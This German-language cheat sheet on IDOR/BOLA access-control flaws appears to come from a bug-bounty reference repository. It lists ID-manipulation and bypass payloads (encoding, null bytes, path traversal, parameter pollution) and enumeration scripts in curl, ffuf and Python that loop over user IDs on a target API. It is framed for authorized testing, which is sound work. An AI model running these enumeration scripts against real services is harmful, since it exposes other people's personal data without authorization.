# 🔓 IDOR – Insecure Direct Object Reference

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗██████╗  ██████╗ ██████╗ 
  ██║██╔══██╗██╔═══██╗██╔══██╗
  ██║██║  ██║██║   ██║██████╔╝
  ██║██║  ██║██║   ██║██╔══██╗
  ██║██████╔╝╚██████╔╝██║  ██║
  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
   Unsichere direkte Objektreferenz
```

<p align="center">
  <img src="https://img.shields.io/badge/IDOR-Access_Control-red?style=for-the-badge" alt="IDOR">
  <img src="https://img.shields.io/badge/BOLA-Authorization-blue?style=for-the-badge" alt="BOLA">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

## 📋 Inhaltsverzeichnis

- [Was ist IDOR](#-was-ist-idor)
- [Wo suchen?](#-wo-suchen)
- [ID-Arten und ihre Veränderung](#-id-arten-und-ihre-veränderung)
- [Umgehungstechniken](#-umgehungstechniken)
- [Testmethodik](#-testmethodik)
- [Werkzeuge und Automatisierung](#-werkzeuge-und-automatisierung)

---

## 🎯 Was ist IDOR

**IDOR** bezeichnet eine unsichere direkte Objektreferenz: Eine Anwendung stellt direkte Verweise auf interne Objekte wie Datenbankeinträge oder Dateien bereit, ohne die erforderlichen Berechtigungen angemessen zu prüfen.

### Auswirkungen
- 🔴 **Datendiebstahl** – Auf Daten anderer Benutzer zugreifen
- 🔴 **Rechteausweitung** – Auf Verwaltungsfunktionen zugreifen
- 🔴 **Kontoübernahme** – Andere Konten verändern
- 🔴 **Datenmanipulation** – Einträge löschen oder verändern

### IDOR vs BOLA
| IDOR | BOLA |
|------|------|
| Traditioneller Begriff | Begriff aus der API-Sicherheit |
| — | Broken Object Level Authorization (fehlerhafte Autorisierung auf Objektebene) |

---

## 🔍 Wo suchen?

### URL-Parameter
```
/user/profile?id=123
/api/users/123
/download?file=report_123.pdf
/account/settings/123
/orders/view/123
```

### POST-/PUT-Anfragetext
```json
{
  "user_id": 123,
  "account_id": 123,
  "order_id": 123
}
```

### Header
```http
X-User-ID: 123
X-Account-ID: 123
Cookie: user_id=123
```

### Häufige Parameter
```
id, user_id, uid, account_id, aid
profile_id, pid, order_id, oid
doc_id, document_id, file_id
invoice_id, transaction_id, ref
customer_id, cid, member_id
```

### Häufige Endpunkte
```
/api/users/{id}
/api/orders/{id}
/api/invoices/{id}
/api/documents/{id}
/api/messages/{id}
/download/{id}
/files/{id}
/profile/{id}
/settings/{id}
```

---

## 🔢 ID-Arten und ihre Veränderung

### Fortlaufende IDs
```
# Häufigster Fall – erhöhen oder verringern
/api/users/1
/api/users/2
/api/users/3

# Grenzwerte prüfen
/api/users/0
/api/users/-1
/api/users/9999999
```

### UUIDs
```
# Prüfen, ob die Kennung tatsächlich zufällig ist
550e8400-e29b-41d4-a716-446655440000
550e8400-e29b-41d4-a716-446655440001  # Letzten Teil erhöhen

# Nach Mustern suchen
# Zeitbasierte UUIDs (v1) – laut Vorlage vorhersagbar
# Zufällige UUIDs (v4) – schwerer zu erraten
```

### Kodierte IDs
```
# Base64
echo "123" | base64  → MTIz
echo "124" | base64  → MTI0

# Kodierte Werte prüfen
/api/users/MTIz  → decode = 123
/api/users/MTI0  → decode = 124

# Hexadezimale Kodierung
123 → 7b
124 → 7c
```

### Gehaschte IDs
```
# MD5-Hash der ID
/user/202cb962ac59075b964b07152d234b70  → md5(123)

# Verschiedene Algorithmen prüfen
# Prüfen, ob der Hash auf der ID basiert oder zufällig ist
```

### Eigene Formate
```
# IDs mit Präfix
/user/USR_123
/order/ORD_456
/doc/DOC_789

# Zeitstempelbasiert
/file/20240128_001
/file/20240128_002
```

---

<a name="-umgehungstechniken"></a>

## 🛡️ Umgehungstechniken

### Parameter verändern
```bash
# Original
GET /api/users/123

# Varianten
GET /api/users/124
GET /api/users/123,124
GET /api/users/123%00124
GET /api/users/[123,124]
GET /api/users?id=123&id=124
```

### HTTP-Methode wechseln
```bash
# Falls GET blockiert wird, andere Methoden prüfen
GET /api/users/124     → Blocked
POST /api/users/124    → Allowed?
PUT /api/users/124     → Allowed?
```

### In Arrays oder Objekte einbetten
```json
// Falls id=124 blockiert wird, folgende Varianten prüfen:
{"id": [124]}
{"id": {"$eq": 124}}
{"ids": [123, 124]}
```

### Umgehung durch Kodierung
```
# URL-kodieren
/api/users/12%34  → 124
/api/users/%31%32%34  → 124

# Doppelt kodieren
/api/users/%2531%2532%2534  → 124

# Unicode
/api/users/１２４  → Full-width 124
```

### Groß-/Kleinschreibung verändern
```bash
/API/USERS/124
/Api/Users/124
/api/Users/124
```

### Mit Path Traversal kombinieren
```
/api/users/123/../124
/api/users/./124
/api/users/123/../../users/124
```

### Nullbyte
```
/api/users/124%00
/api/users/124%00.json
/api/users/124\x00
```

### JSON-Parameter-Injection
```json
// Ursprüngliche Anfrage
{"user_id": 123, "action": "view"}

// Angriff
{"user_id": 124, "action": "view"}
{"user_id": "123\",\"target_id\": \"124", "action": "view"}
```

### HPP (HTTP Parameter Pollution)
```
/api/user?id=123&id=124
/api/user?id=123&ID=124
/api/user?user_id=123&userid=124
```

---

## 📋 Testmethodik

### Schritt 1: Erkennen
```
1. Alle Endpunkte mit Objektreferenzen erfassen
2. Alle Parameter notieren, die wie IDs aussehen
3. Zwei Testkonten anlegen (Benutzer A und Benutzer B)
```

### Schritt 2: Erfassen
```
1. Als Benutzer A die eigenen IDs notieren
2. Als Benutzer B die eigenen IDs notieren
3. Muster in den IDs erkennen
```

### Schritt 3: Prüfen
```
1. Als Benutzer A den Zugriff auf Objekte von Benutzer B prüfen
2. Alle CRUD-Operationen prüfen:
   - Lesen (GET)
   - Erstellen (POST)
   - Aktualisieren (PUT/PATCH)
   - Löschen (DELETE)
```

### Schritt 4: Erweitern
```
1. IDs mit Verwaltungsbezug prüfen (laut Vorlage häufig 1, admin, 0)
2. Besondere Werte prüfen (null, undefined, *)
3. Mit anderen Schwachstellen kombinieren
```

### Checkliste
```markdown
- [ ] URL-Parameter
- [ ] Parameter im POST-Anfragetext
- [ ] Header (Cookies und eigene Header)
- [ ] Verborgene Formularfelder
- [ ] API-Endpunkte
- [ ] Dateidownloads
- [ ] Exportfunktionen
- [ ] Löschfunktionen
- [ ] Verwaltungsfunktionen
```

---

<a name="-werkzeuge-und-automatisierung"></a>

## 🛠️ Werkzeuge und Automatisierung

### Burp-Suite-Erweiterungen
```
- Autorize (automatisierte Prüfung auf IDOR)
- AuthMatrix
- Auto Repeater
```

### Autorize einrichten
```
1. Die Erweiterung Autorize installieren
2. Das Sitzungscookie von Benutzer B kopieren
3. In Autorize eintragen
4. Als Benutzer A die Anwendung erkunden
5. Autorize prüft mit der Sitzung von Benutzer B
```

### Manuell mit curl prüfen
```bash
# Token von Benutzer A
TOKEN_A="user_a_jwt_token"

# Auf eine Ressource von Benutzer B zugreifen
curl -H "Authorization: Bearer $TOKEN_A" \
     https://api.target.com/users/124

# IDs in einer Schleife durchlaufen
for i in {1..100}; do
  curl -s -H "Authorization: Bearer $TOKEN_A" \
       "https://api.target.com/users/$i" | grep -q "email" && echo "IDOR: $i"
done
```

### ffuf für IDOR-Tests
```bash
# Numerische IDs
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w <(seq 1 1000) \
     -mc 200

# Mit Wortliste
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w ids.txt \
     -mc 200 -fc 403,404
```

### Python-Skript
```python
import requests

base_url = "https://api.target.com/users/"
headers = {"Authorization": "Bearer USER_A_TOKEN"}
my_id = 123

for i in range(1, 1000):
    if i == my_id:
        continue
    r = requests.get(f"{base_url}{i}", headers=headers)
    if r.status_code == 200:
        print(f"[IDOR] Accessible: {i}")
        print(r.json())
```

---

## 📊 Kurzreferenz

### Häufig betroffene Funktionen
| Funktion | Risiko |
|----------|------|
| Profil ansehen | Datenabfluss |
| Datei herunterladen | Dateizugriff |
| Eintrag löschen | Datenverlust |
| Einstellungen ändern | Kontoübernahme |
| Bestellungen ansehen | Verletzung der Privatsphäre |
| Daten exportieren | Umfangreicher Datendiebstahl |

### Was gehört in den Bericht?
```markdown
## IDOR im Benutzerprofil

**Endpunkt:** GET /api/users/{id}

**Schritte:**
1. Als Benutzer A anmelden (ID: 123)
2. GET /api/users/124 anfordern
3. Feststellen, dass die Daten von Benutzer B zurückgegeben werden

**Auswirkung:** Jeder angemeldete Benutzer kann auf 
die personenbezogenen Daten aller anderen Benutzer zugreifen.

**PoC:**
curl -H "Authorization: Bearer [token]" \
     https://api.target.com/users/124
```

---

## 💡 Praktische Tipps

1. **Zwei Konten verwenden** – Immer mit 2 Konten prüfen
2. **Alle Methoden prüfen** – GET, POST, PUT, DELETE
3. **Alle Stellen berücksichtigen** – URLs, Anfragetext, Header und Cookies
4. **Grenzfälle prüfen** – 0, -1, null, undefined
5. **Angriffe kombinieren** – IDOR + CSRF, IDOR + XSS
6. **Exportfunktionen prüfen** – PDF- und CSV-Exporte können betroffen sein
7. **Mobile APIs** – Laut Vorlage häufig weniger sicher als Webanwendungen

---

## 📚 Ressourcen

- [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [HackTricks IDOR](https://book.hacktricks.xyz/pentesting-web/idor)
- [PortSwigger: Zugriffskontrolle](https://portswigger.net/web-security/access-control/idor)

---

<p align="center">
  <b>🔓 IDOR-Schwachstellen finden!</b><br>
  <i>Nur für autorisierte Tests!</i>
</p>

---

## Hinweise zur deutschen Ausgabe

> **Berechtigungen und Begriffe:** Eine direkte Objektreferenz allein ist keine Schwachstelle. Entscheidend ist, ob der angemeldete Benutzer die konkrete Aktion am konkreten Objekt ausführen darf. BOLA beschreibt die fehlende Autorisierung auf Objektebene; fehlender Zugriffsschutz für eine gesamte Funktion wird gesondert als BFLA eingeordnet. Die einspaltige BOLA-Erklärungszeile der Originaltabelle wurde auf zwei Zellen verteilt; der Gedankenstrich ist nur ein Platzhalter. [OWASP: BOLA](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/), [PortSwigger: IDOR](https://portswigger.net/web-security/access-control/idor).

> **Kennungen und Darstellungen:** UUIDs, Base64 und Hashwerte ersetzen keine Autorisierungsprüfung. Zeitbasierte UUIDs und zufällige UUIDs haben unterschiedliche Eigenschaften; auch UUIDs dürfen nicht allein als Zugriffsberechtigung verstanden werden. Das bloße Erhöhen eines Beispiels beweist weder dessen Vergabe noch eine Vorhersagbarkeit der Anwendung. Die Base64-Zeilen kombinieren Befehle, Pfeile und angenommene Ausgaben; `echo` fügt normalerweise einen Zeilenumbruch hinzu. Die Zeilen sind daher keine unverändert ausführbaren Shell-Einzeiler mit garantiert genau der dargestellten Ausgabe. [RFC 9562: Sicherheit von UUIDs](https://www.rfc-editor.org/rfc/rfc9562.html#section-8).

> **Beispielgrenzen und Auswertung:** HTTP 200, eine enthaltene E-Mail-Zeichenfolge oder eine zurückgegebene JSON-Struktur allein belegen keinen unberechtigten Zugriff. Die Skripte vergleichen die tatsächliche Berechtigung und Objektzuordnung nicht vollständig. Die JSON-Blöcke mit `//` sind kommentierte Lernbeispiele und keine unmittelbar gültigen JSON-Dokumente. Kodierung, Arrays, Methodenwechsel und doppelte Parameter führen nur abhängig von der jeweiligen Verarbeitung zu einem anderen Ergebnis; sie sind keine universellen Umgehungen. CRUD bezeichnet Erstellen, Lesen, Aktualisieren und Löschen; die Zuordnung zu HTTP-Methoden ist hier vereinfacht. Die pauschalen Auswirkungen und die Bewertung mobiler APIs sind Angaben der Vorlage und müssen im Einzelfall belegt werden. Sämtliche ursprünglichen Requests, Payloads, Parameter, Pfade und Ausgabe-Literale bleiben unverändert; kein Beispiel wurde ausgeführt.
